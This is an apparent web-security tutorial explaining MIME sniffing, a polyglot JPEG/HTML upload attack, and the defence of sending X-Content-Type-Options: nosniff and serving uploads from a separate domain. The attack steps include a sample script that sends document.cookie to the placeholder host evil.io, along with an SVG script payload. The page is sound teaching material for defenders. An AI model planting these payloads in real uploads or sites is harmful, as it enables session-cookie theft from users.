📖 What is MIME Sniffing?

Browsers try to be helpful: if a server sends a file with the wrong Content-Type, the browser "sniffs" the actual content and decides what type it really is. Internet Explorer introduced this behaviour; other browsers followed to maintain compatibility.

While useful in the early web, MIME sniffing becomes a security hole when user-uploaded files are served. An attacker can upload a file that looks like an image to the server (passes .jpg extension checks) but contains HTML/JavaScript that the browser will execute.

🔴 The Attack — Polyglot File Upload

A polyglot file is simultaneously a valid file of two types. A common example: a JPEG file that also contains a valid HTML page with an embedded script. The image passes the server's file-type check but the browser sniffs it as HTML and renders it.

Step-by-step scenario:

  1. 1Target site allows profile picture uploads, validates the file extension (.jpg) and reads the first few bytes to confirm it is a JPEG.
  2. 2Attacker crafts a file whose first bytes are a valid JPEG header (FF D8 FF) followed by an HTML page:
    FF D8 FF E0 <!-- valid JPEG magic bytes -->
<!-- then immediately: -->
<html><body><script>
  fetch('https://evil.io/steal?c=' + document.cookie);
</script></body></html>
  3. 3Server stores the file and serves it as image/jpeg.
  4. 4Without X-Content-Type-Options: nosniff, the browser ignores the declared image/jpeg type, sniffs the HTML content, and renders it as a web page.
  5. 5The embedded script executes under the site's origin and steals session cookies.

Proof of concept: this server serves /mime-demo.js with Content-Type: text/plain. Without nosniff, older IE/Edge will execute it as JavaScript when included via a <script> tag. Modern Chrome/Firefox are already stricter for scripts, but the principle applies to HTML content and SVG files.

<!-- attacker embeds the "text" file as a script -->
<script src="/mime-demo.js"></script>
<!-- IE/old Edge sniffs it as JS and runs it despite text/plain -->

More dangerous with SVG: SVG files can contain <script> and are a common upload vector because they look like images.

Content-Type: image/svg+xml
Body: <svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

✅ The Fix — X-Content-Type-Options: nosniff

This single header tells the browser: "Trust the Content-Type I declare. Do not sniff."

X-Content-Type-Options: nosniff

When set:

  • Scripts are only loaded if served as application/javascript or text/javascript.
  • Stylesheets are only loaded if served as text/css.
  • All other content types are taken at face value.

In Nginx:

add_header X-Content-Type-Options "nosniff" always;

Also set correct Content-Types on uploads. Serve user-uploaded files from a separate domain (e.g. static.example.com with no cookies) so that even if something slips through, it cannot access session cookies for app.example.com.
